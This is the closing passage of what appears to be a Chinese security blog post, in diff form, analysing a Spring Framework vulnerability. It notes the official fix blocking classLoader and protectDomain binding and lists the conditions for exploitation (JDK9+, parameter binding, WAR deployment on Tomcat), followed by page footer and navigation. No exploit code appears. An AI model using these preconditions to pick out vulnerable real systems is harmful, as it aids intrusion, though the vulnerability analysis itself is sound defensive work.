+<p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/Pasted%20image%2020220331171719.png" alt="Pasted image 20220331171719"></p>
+<h2 id="fix">Fix</h2>
+<p>31 号的时候官方已经进行了修复，禁止了获取任何属性的 <code>classLoader</code> 和 <code>protectDomain</code> ：<a href="https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15">Commit</a></p>
+<p>总结一下这个漏洞的利用条件：</p>
+<ul>
+<li>JDK9+</li>
+<li>Spring后端使用变量绑定</li>
+<li>Spring以War包形式托管（最常见的是SpringMVC，外置Tomcat的SpringBoot应用很少见）</li>
+</ul>
+
+    </div>
+
+    
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/java%E5%AE%89%E5%85%A8/">Java安全</a>
+          <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/goinaction/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">《GoInAction》阅读简单记录</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/hessianmemshell/">
+            <span class="next-text nav-default">Hessian二次反序列化与JDK自带HTTP库的内存马</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:marszs.jin@foxmail.com" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/Marszs" class="iconfont icon-github" title="github"></a>
+  <a href="http://localhost:1313/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span></span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
